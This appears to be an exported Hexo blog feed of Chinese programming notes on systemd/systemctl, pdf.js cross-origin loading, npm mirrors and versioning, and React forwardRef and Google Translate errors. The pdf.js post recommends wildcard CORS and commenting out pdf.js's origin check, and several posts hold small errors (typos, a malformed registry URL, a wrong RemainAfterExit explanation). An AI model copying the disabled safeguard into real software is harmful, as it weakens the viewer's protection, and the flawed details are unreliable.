<td>定义何种情况Systemd会自动重启当前服务，可能的值包括always（总是重启）、on-success、on-failure、on-abnormal、on-abort、on-watchdog。当设置 Restart=always时，则此daemon服务终止后，会再次的启动此服务。举例来说，如果你在tty2使用文字界面登陆，操作完毕后登出，这个时候tty2就已经结束服务了。 但是你会看到屏幕又立刻产生一个新的tty2的登陆画面等待你的登陆。那就是Restart的功能。除非使用systemctl强制将此服务关闭，否则这个服务会源源不绝的一直重复启动。</td>
</tr>
<tr>
<td>RestartSec</td>
<td>自动重启当前服务间隔的秒数。默认是100ms（毫秒）。</td>
</tr>
<tr>
<td>TimeoutSec</td>
<td>若这个服务在启动或者是关闭时，因为某些缘故导致无法顺利“正常启动或正常结束”的情况下，则我们要等多久才进入“强制结束”的状态。</td>
</tr>
<tr>
<td>Environment</td>
<td>指定环境变量。</td>
</tr>
<tr>
<td>PrivateTmp</td>
<td>布尔值，是否使用私有临时文件夹，建议true，防止临时文件相互读写，提升安全性。</td>
</tr>
<tr>
<td>RemainAfterExit</td>
<td>当设置RemainAfterExit=true时，则当这个daemon所属的所有程序都终止之后，此服务会再尝试启动。这对于Type=oneshot的服务很有帮助。</td>
</tr>
<tr>
<td>KillMode</td>
<td>可以是process，control-group，none的其中一种，如果是process，则daemon终止时，只会终止主要的程序（ExecStart 接的后面那串指令），如果是control-group， 则由此daemon所产生的其他control-group的程序，也都会被关闭。如果是none的话，则没有程序会被关闭。</td>
</tr>
</tbody></table>
<h1 id="Install-部份"><a href="#Install-部份" class="headerlink" title="[Install] 部份"></a>[Install] 部份</h1><p>通常是配置文件的最后一个区块，用来定义如何启动，以及是否开机启动。它的主要字段如下。</p>
<table>
<thead>
<tr>
<th>设置参数</th>
<th>参数意义说明</th>
</tr>
</thead>
<tbody><tr>
<td>WantedBy</td>
<td>它的值是一个或多个Target，当前 Unit 激活时（enable）符号链接会放入/etc/systemd/system目录下面以Target名 + .wants后缀构成的子目录中。通常，大多的服务性质的unit都是附挂在multi-user.target下面。</td>
</tr>
<tr>
<td>RequiredBy</td>
<td>它的值是一个或多个Target，当前Unit激活时，符号链接会放入/etc/systemd/system目录下面以Target名 + .required后缀构成的子目录中。</td>
</tr>
<tr>
<td>Also</td>
<td>该unit被激活为enable时，Also后的unit也被激活为enable。</td>
</tr>
<tr>
<td>Alias</td>
<td>创建一个unit的链接别名。systemctl enable相关的服务时，则此服务会进行链接文件的创建。以multi-user.target 为例，当设置default.target为别名时，/usr/lib/systemd/system/multi-user.target会创建名为/etc/systemd/system/default.target的别名链接。</td>
</tr>
</tbody></table>
<h1 id="systemctl-基本命令"><a href="#systemctl-基本命令" class="headerlink" title="systemctl 基本命令"></a>systemctl 基本命令</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 列出正在运行的 Unit</span>
$ systemctl list-units

<span class="token comment"># 列出所有Unit，包括没有找到配置文件的或者启动失败的</span>
$ systemctl list-units --all

<span class="token comment"># 列出所有没有运行的 Unit</span>
$ systemctl list-units --all --state<span class="token operator">=</span>inactive

<span class="token comment"># 列出所有加载失败的 Unit</span>
$ systemctl list-units --failed

<span class="token comment"># 列出所有正在运行的、类型为 service 的 Unit</span>
$ systemctl list-units --type<span class="token operator">=</span>service

<span class="token comment"># 显示系统状态</span>
$ systemctl status

<span class="token comment"># 显示单个 Unit 的状态</span>
$ sysystemctl status bluetooth.service

<span class="token comment"># 显示远程主机的某个 Unit 的状态</span>
$ systemctl -H root@rhel7.example.com status httpd.service

<span class="token comment"># 显示某个 Unit 是否正在运行</span>
$ systemctl is-active application.service

<span class="token comment"># 显示某个 Unit 是否处于启动失败状态</span>
$ systemctl is-failed application.service

<span class="token comment"># 显示某个 Unit 服务是否建立了启动链接</span>
$ systemctl is-enabled application.service

<span class="token comment"># 立即启动一个服务</span>
$ <span class="token function">sudo</span> systemctl start apache.service

<span class="token comment"># 立即停止一个服务</span>
$ <span class="token function">sudo</span> systemctl stop apache.service

<span class="token comment"># 重启一个服务</span>
$ <span class="token function">sudo</span> systemctl restart apache.service

<span class="token comment"># 杀死一个服务的所有子进程</span>
$ <span class="token function">sudo</span> systemctl <span class="token function">kill</span> apache.service

<span class="token comment"># 重新加载一个服务的配置文件</span>
$ <span class="token function">sudo</span> systemctl reload apache.service

<span class="token comment"># 重载所有修改过的配置文件</span>
$ <span class="token function">sudo</span> systemctl daemon-reload

<span class="token comment"># 显示某个 Unit 的所有底层参数</span>
$ systemctl show httpd.service

<span class="token comment"># 显示某个 Unit 的指定属性的值</span>
$ systemctl show -p CPUShares httpd.service

<span class="token comment"># 设置某个 Unit 的指定属性</span>
$ <span class="token function">sudo</span> systemctl set-property httpd.service <span class="token assign-left variable">CPUShares</span><span class="token operator">=</span><span class="token number">500</span>

<span class="token comment"># 列出一个 Unit 的所有依赖</span>
$ systemctl list-dependencies nginx.service

<span class="token comment"># 上面命令的输出结果之中，有些依赖是 Target 类型（详见下文），默认不会展开显示。如果要展开 Target，就需要使用--all参数。</span>
$ systemctl list-dependencies --all nginx.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本文摘自</p>
<blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html">http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html</a></p>
</blockquote>
<blockquote>
<p><a href="https://www.jianshu.com/p/0e8410049ee8">https://www.jianshu.com/p/0e8410049ee8</a></p>
</blockquote>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>systemctl</tag>
      </tags>
  </entry>
  <entry>
    <title>node配置服务器跨域使pdfjs加载非同源文件</title>
    <url>/2019/03/24/node%E9%85%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B7%A8%E5%9F%9F%E4%BD%BFpdfjs%E5%8A%A0%E8%BD%BD%E9%9D%9E%E5%90%8C%E6%BA%90%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="node配置服务器跨域使pdfjs加载非同源文件"><a href="#node配置服务器跨域使pdfjs加载非同源文件" class="headerlink" title="node配置服务器跨域使pdfjs加载非同源文件"></a>node配置服务器跨域使pdfjs加载非同源文件</h1><p>pdfjs因为同源策略，只能加载本地的pdf，想要加载远程的pdf就会报跨域的错，查看<a href="https://github.com/mozilla/pdf.js/issues/4530">官方文档</a>后发现pdfjs本身并不阻止加载远程pdf文件，只要文件服务器配置好跨域即可。</p>
<p>这里使用了node中的express框架搭建了一个简单的静态文件服务器。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// pdfjs官网issue提供的跨域配置方案</span>
<span class="token comment">// &#123;</span>
<span class="token comment">//   "Access-Control-Allow-Origin": "*",</span>
<span class="token comment">//   "Access-Control-Allow-Headers": "range",</span>
<span class="token comment">//   "Access-Control-Expose-Headers": "content-range, content-length, accept-ranges",</span>
<span class="token comment">//   "Access-Control-Allow-Methods": "*"</span>
<span class="token comment">// &#125;</span>
<span class="token comment">// 引入express</span>
<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 根据官方文档中的issue配置跨域</span>
app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Access-Control-Allow-Origin"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Access-Control-Allow-Headers"</span><span class="token punctuation">,</span> <span class="token string">"range"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span>
    <span class="token string">"Access-Control-Expose-Headers"</span><span class="token punctuation">,</span>
    <span class="token string">"content-range, content-length, accept-ranges"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Access-Control-Allow-Methods"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 配置静态文件目录</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 监听服务器的某个端口</span>
<span class="token keyword">const</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8082</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"server-start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>配置好跨域后，你会发现还是报跨域的错，在pdfjs源码中查找file origin does not match viewer，就会发现源码中只要不是同源就会抛出异常，注释掉原码中的throw error即可。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>origin <span class="token operator">!==</span> viewerOrigin <span class="token operator">&amp;&amp;</span> protocol <span class="token operator">!==</span> <span class="token string">'blob:'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// throw new Error('file origin does not match viewer\'s');</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>node</category>
      </categories>
      <tags>
        <tag>express</tag>
        <tag>node</tag>
        <tag>pdfjs</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title>npm使用淘宝镜像</title>
    <url>/2018/10/20/npm%E4%BD%BF%E7%94%A8%E6%B7%98%E5%AE%9D%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<p>由于国外镜像太慢，所以使用国内的淘宝npm镜像</p>
<p>方法一：命令行修改npm配置</p>
<p>更换registry为淘宝镜像地址</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 更换镜像</span>
<span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org/
<span class="token comment"># 检查更换是否成功</span>
<span class="token function">npm</span> config get registry<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>方法二：直接修改npm配置文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 打开npm配置文件</span>
<span class="token function">npm</span> config edit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>将 registry=<a href="https://registry.npmjs.org/">https://registry.npmjs.org/</a> 更换为 registry=<a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org/</a></p>
<p>注意：将npm源更换为淘宝源后，npm search功能会报错，只能使用npm install功能。可以在使用npm search的时候手动临时使用官方源</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> search packageName --registry<span class="token operator">=</span>https//registry.npmjs.org/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      <categories>
        <category>npm</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>npm执行install报错ENOENT没有文件或目录</title>
    <url>/2021/05/20/npm%E6%89%A7%E8%A1%8Cinstall%E6%8A%A5%E9%94%99ENOENT%E6%B2%A1%E6%9C%89%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<p>遇到 npm 执行命令<code>npm install</code>时报错，ENOENT：No Such Files Or Directories…。删除 node_modules 目录也无法修复。</p>
<h2 id="ENOENT"><a href="#ENOENT" class="headerlink" title="ENOENT"></a>ENOENT</h2><p>ENOENT 是 Error NO ENTry（或 Error NO ENTity）的缩写，之所以这样缩写是因为 C 的编译器最初不支持超过 8 个字符的符号。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>可以同时删除 package-lock.json 与 node_modules 目录，再执行<code>npm install</code>。</p>
<blockquote>
<p><a href="https://github.com/mapbox/node-sqlite3/issues/900">参考资料 1</a></p>
<p><a href="https://stackoverflow.com/questions/19902828/why-does-enoent-mean-no-such-file-or-directory#:~:text=It's%20an%20abbreviation%20of%20Error,than%208%20characters%20in%20symbols.">参考资料 2</a></p>
</blockquote>
]]></content>
      <categories>
        <category>npm</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>npm版本命令</title>
    <url>/2021/04/10/npm%E7%89%88%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="几种-version-相关的-npm-命令"><a href="#几种-version-相关的-npm-命令" class="headerlink" title="几种 version 相关的 npm 命令"></a>几种 version 相关的 npm 命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 通过命令变更package.json中的版本号</span>
<span class="token function">npm</span> version <span class="token punctuation">[</span><span class="token operator">&lt;</span>newversion<span class="token operator">></span> <span class="token operator">|</span> major <span class="token operator">|</span> minor <span class="token operator">|</span> patch <span class="token operator">|</span> premajor <span class="token operator">|</span> preminor <span class="token operator">|</span> prepatch <span class="token operator">|</span> prerelease <span class="token operator">|</span> from-git<span class="token punctuation">]</span>
<span class="token comment"># 查看当前npm版本</span>
<span class="token function">npm</span> <span class="token punctuation">[</span>-v <span class="token operator">|</span> --version<span class="token punctuation">]</span>
<span class="token comment"># 查看某个已发布包的版本号</span>
<span class="token function">npm</span> view <span class="token operator">&lt;</span>pkg<span class="token operator">></span> version
<span class="token comment"># 查看当前目录下所有包与依赖的版本</span>
<span class="token function">npm</span> <span class="token function">ls</span> <span class="token comment">#还可以使用--depth=&lt;number>参数来选择查看的目录层级</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<span id="more"></span>

<h2 id="npm-version-相关命令配置"><a href="#npm-version-相关命令配置" class="headerlink" title="npm version 相关命令配置"></a>npm version 相关命令配置</h2><h3 id="allow-same-version"><a href="#allow-same-version" class="headerlink" title="allow-same-version"></a>allow-same-version</h3><ul>
<li>default: false</li>
<li>type: boolean</li>
</ul>
<p>允许 npm version 将新的版本设置为与当前版本相同值，默认是不允许</p>
<h3 id="git-tag-version"><a href="#git-tag-version" class="headerlink" title="git-tag-version"></a>git-tag-version</h3><ul>
<li>default: true</li>
<li>type: boolean</li>
</ul>
<p>当使用 git version 命令时 git 自动提交一个最新版本的 tag，默认提交</p>
<h3 id="commit-hooks"><a href="#commit-hooks" class="headerlink" title="commit-hooks"></a>commit-hooks</h3><ul>
<li>default: true</li>
<li>type: boolean</li>
</ul>
<p>当使用 git version 命令时调用 git 提交钩子，默认为调用</p>
<h3 id="sign-git-tag"><a href="#sign-git-tag" class="headerlink" title="sign-git-tag"></a>sign-git-tag</h3><ul>
<li>default: false</li>
<li>type: boolean</li>
</ul>
<p>将 -s 标志传递给 git 进行 tag 签名，默认关闭；注意必需在 git config 中配置 GPG key 才能正确使用该配置</p>
<h3 id="workspaces"><a href="#workspaces" class="headerlink" title="workspaces"></a>workspaces</h3><ul>
<li>default: false</li>
<li>type: boolean</li>
</ul>
<p>启用工作区环境，当设置新的版本时，仅有工作区内的会变更，默认不开启</p>
<h3 id="workspace"><a href="#workspace" class="headerlink" title="workspace"></a>workspace</h3><ul>
<li>default: []</li>
<li>type: array</li>
</ul>
<p>开启工作区并限定该配置指定的文件或文件夹为工作区</p>
<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>在包目录下运行 npm version 命令来升级版本，新的版本号将写入 package.json，package-lock.json，npm-shrinkwrap.json（若存在）。</p>
<p><code>newversion</code> 参数必需是一个 semver 字符串(semver 为 semantic-version 的缩写，详见<a href="https://github.com/npm/node-semver">node-semver 库的说明</a>)或者 semver 参数（<code>patch</code>, <code>minor</code>, <code>major</code>, <code>prepatch</code>, <code>preminor</code>, <code>premajor</code>, <code>prerelease</code>)或<code>from-git</code>。在使用 semver 参数的情况下，指定的版本号字段将自增 1。使用<code>from-git</code>参数会读取最新的 git tag 作为 npm 版本号。</p>
<p>若是在一个 git 版本库中执行 npm version 命令，这将自动创建一次 git commit 与 tag。该行为受到 git-tag-version 配置的控制，也可以被命令禁用<code>npm --no-git-tag-version version</code>。另外要注意的是当工作区不是 clean 状态时，npm version 命令会失败，除非使用 <code>-f</code> 或 <code>--force</code> 参数。</p>
<p>如果使用 <code>-m</code> 或 <code>--message</code> 参数，将会使用后面的字符串作为提交信息，如果提交信息中包含<code>%s</code>字符串，它将会被版本号替换。</p>
<p><code>npm version patch -m &quot;Upgrade to %s for reasons&quot;</code></p>
<p>如果配置 sing-git-tag 为 true，相当于向 git tag 传递了-s 参数，进行签名，这需要你在 git config 中提供 GPG key。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> config <span class="token builtin class-name">set</span> sign-git-tag <span class="token boolean">true</span>
$ <span class="token function">npm</span> version patch
You need a passphrase to unlock the secret key <span class="token keyword">for</span>
user: <span class="token string">"isaacs (http://blog.izs.me/) &lt;i@izs.me>"</span>
<span class="token number">2048</span>-bit RSA key, ID 6C481CF6, created <span class="token number">2010</span>-08-31
Enter passphrase:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>npm</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>react在typescript下传递ref给子组件</title>
    <url>/2021/05/19/react%E5%9C%A8typescript%E4%B8%8B%E4%BC%A0%E9%80%92ref%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>在做可复用组件时，我们常常需要给函数组件传递 ref 属性，以访问或操作组件内部的 DOM。</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> useRef <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">MyFunctionComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token operator">&lt;</span>input <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">ParentComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> textInputRef <span class="token operator">=</span> <span class="token function">useRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">&lt;</span>MyFunctionComponent ref<span class="token operator">=</span><span class="token punctuation">&#123;</span>textInputRef<span class="token punctuation">&#125;</span><span class="token operator">></span> <span class="token comment">// 这是无效的</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="在-jsx-下使用"><a href="#在-jsx-下使用" class="headerlink" title="在 jsx 下使用"></a>在 jsx 下使用</h2><p>默认情况下，我们不能在函数组件上使用 ref 属性，因为它们没有实例。</p>
<p>如果要在函数组件中使用 ref，可以使用 forwardRef（可与 useImperativeHandle 结合使用）。</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> useRef<span class="token punctuation">,</span> forwardRef <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> MyFunctionComponent <span class="token operator">=</span> <span class="token function">forwardRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span>props<span class="token punctuation">,</span> ref<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token operator">&lt;</span>input ref<span class="token operator">=</span><span class="token punctuation">&#123;</span>ref<span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">ParentComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> textInputRef <span class="token operator">=</span> <span class="token function">useRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">&lt;</span>MyFunctionComponent ref<span class="token operator">=</span><span class="token punctuation">&#123;</span>textInputRef<span class="token punctuation">&#125;</span><span class="token operator">></span> <span class="token comment">// 这是无效的</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="在-tsx-下使用"><a href="#在-tsx-下使用" class="headerlink" title="在 tsx 下使用"></a>在 tsx 下使用</h2><p>以上是在 React 中使用 forwardRef 的情况，那么结合了 Typescript，又会发生很多的类型问题，如何在 TS 中使用 forwardRef 呢？</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> useRef<span class="token punctuation">,</span> forwardRef <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> MyFunctionComponent <span class="token operator">=</span> <span class="token generic-function"><span class="token function">forwardRef</span><span class="token generic class-name"><span class="token operator">&lt;</span>HTMLInputElement<span class="token punctuation">,</span> <span class="token builtin">any</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">(</span>props<span class="token punctuation">,</span> ref<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token operator">&lt;</span>input ref<span class="token operator">=</span><span class="token punctuation">&#123;</span>ref<span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">ParentComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> textInputRef <span class="token operator">=</span> <span class="token generic-function"><span class="token function">useRef</span><span class="token generic class-name"><span class="token operator">&lt;</span>HTMLInputElement<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">&lt;</span>MyFunctionComponent ref<span class="token operator">=</span><span class="token punctuation">&#123;</span>textInputRef<span class="token punctuation">&#125;</span><span class="token operator">></span> <span class="token comment">// 这是无效的</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，我们需要在 forwardRef 泛型中定义 ref 类型与 props 类型，需要注意的是泛型中是 ref 类型在前，props 类型在后，而函数组件中是 props 在前，ref 在后。</p>
<p>其次在父组件中 useRef 泛型中也需要定义与 forwardRef 相同的类型。</p>
<p>forwardRef 泛型中，若组件没有用到 props，则 props 类型可不传，默认为{}。示例如下：</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token keyword">const</span> MyFunctionComponent <span class="token operator">=</span> <span class="token generic-function"><span class="token function">forwardRef</span><span class="token generic class-name"><span class="token operator">&lt;</span>HTMLInputElement<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">(</span>props<span class="token punctuation">,</span> ref<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token operator">&lt;</span>input ref<span class="token operator">=</span><span class="token punctuation">&#123;</span>ref<span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>参考资料 <a href="https://www.carlrippon.com/react-forwardref-typescript/">Forwarding React Refs with TypeScript</a></p>
</blockquote>
]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>typescript</tag>
        <tag>forwardRef</tag>
      </tags>
  </entry>
  <entry>
    <title>react谷歌翻译造成的白屏错误</title>
    <url>/2021/05/08/react%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91%E9%80%A0%E6%88%90%E7%9A%84%E7%99%BD%E5%B1%8F%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<h2 id="react-白屏错误，报-failed-to-execute-“insertBefore”-on-“node”"><a href="#react-白屏错误，报-failed-to-execute-“insertBefore”-on-“node”" class="headerlink" title="react 白屏错误，报 failed to execute “insertBefore” on “node”"></a>react 白屏错误，报 failed to execute “insertBefore” on “node”</h2><p>最近遇到个别客户在 Apple Chrome 环境下使用页面时，页面加载就白屏，报错 failed to execute “insertBefore” on “node”。</p>
<p>应急的解决办法：<strong>对报错页面关闭谷歌翻译功能</strong></p>
<span id="more"></span>

<h2 id="错误原因分析"><a href="#错误原因分析" class="headerlink" title="错误原因分析"></a>错误原因分析</h2><p>此错误因 Google 翻译将页面中的 textNodes 替换为 font 标签，而 react 仍然保留了已经不存在于 DOM 树中的 textNodes 所致。</p>
<p>React 会在以下几种情况下抛出这个错误：</p>
<ol>
<li><p>textNode 是条件渲染的且它并不是父节点的唯一子节点。当 textNode 被移除时，React 会调用 <code>parent.removeChild(textNode)</code>并抛出 textNode 不是父节点的子节点的错误。若是唯一子节点则不会抛出错误。</p>
</li>
<li><p>某条件渲染的节点在 textNode 之前。React 会在节点插入时调用 parent.insertBefore(someNode, textNode)，这时就会因为 textNode 已经不是父节点的子节点而报错。</p>
</li>
</ol>
<pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token comment">// 情况 1</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">&#123;</span>condition <span class="token operator">&amp;&amp;</span> <span class="token string">'Welcome'</span><span class="token punctuation">&#125;</span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">Something</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token comment">// 情况 2</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">&#123;</span>condition <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">Something</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token punctuation">&#125;</span><span class="token plain-text">
  Welcome
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token comment">// 不报错的情况</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">&#123;</span>condition <span class="token operator">&amp;&amp;</span> <span class="token string">'Welcome'</span><span class="token punctuation">&#125;</span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

